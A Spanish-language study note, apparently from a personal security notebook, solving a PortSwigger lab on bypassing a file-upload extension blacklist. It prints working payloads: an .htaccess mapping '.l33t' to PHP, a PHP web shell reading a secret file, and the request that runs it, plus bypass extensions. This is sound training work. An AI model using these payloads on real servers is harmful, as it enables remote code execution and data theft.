---
aliases:
  - File Upload 003 - bypass extensión (.htaccess + .l33t)
  - extension blacklist bypass htaccess
tags:
  - vuln/file-upload
  - example
  - portswigger
---

# 003 — Bypass de extensión: blacklist + `.htaccess`

> Lab: Web shell upload via extension blacklist bypass · **Practitioner** · técnica → [[vulnerabilities/017-file-upload-vulnerabilities/file-upload-vulnerabilities|entry point]]

## ¿Por qué acá? (filtra la extensión)
- Ahora el server usa una **lista negra** de extensiones ejecutables (`.php`, `.phtml`…) y rechaza subir el shell con nombre `.php`.
- **La idea:** no bloquea `.htaccess`. Subís un `.htaccess` que **mapea una pseudo-extensión a PHP** y luego subís el shell con esa extensión (que no está en la blacklist).

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = host del lab + la **pseudo-extensión** elegida (`.l33t`).

**Paso 1 — subir el `.htaccess`** que hace que Apache trate `.l33t` como PHP:
<pre class="payload"><code>------x
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php <mark>.l33t</mark></code></pre>
**Paso 2 — subir el shell con la extensión permitida** `exploit.l33t`:
<pre class="payload"><code>------x
Content-Disposition: form-data; name="avatar"; filename="exploit<mark>.l33t</mark>"
Content-Type: text/plain

&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;</code></pre>
**Paso 3 — pedir el fichero** (ya se ejecuta como PHP por el `.htaccess`):
<pre class="payload"><code>GET /files/avatars/exploit<mark>.l33t</mark> HTTP/1.1
Host: <mark>LAB-ID.web-security-academy.net</mark></code></pre>

## Verificación
El GET a `exploit.l33t` devuelve el **secreto** (no el texto PHP crudo). Si volviera el `<?php …` sin ejecutar → el `.htaccess` no surtió efecto.

## Detalles que se pasan por alto
- `.l33t` es "leet" (`l` + `33t`): cualquier pseudo-extensión sirve **mientras la mapees** con `AddType`.
- La blacklist solo mira el **nombre** subido, no el efecto del `.htaccess`.
- Script listo: [[vulnerabilities/017-file-upload-vulnerabilities/webshell_blacklist_bypass.py]] (login + 2 subidas + lee el secreto).
- Otras extensiones que suelen escapar de la blacklist: `.php5`, `.phtml`, `.shtml`, `.phar`.

→ Siguiente: [[vulnerabilities/017-file-upload-vulnerabilities/examples/004-polyglot-jpeg-php|004 · valida el contenido (magic bytes) → polyglot JPEG+PHP]]
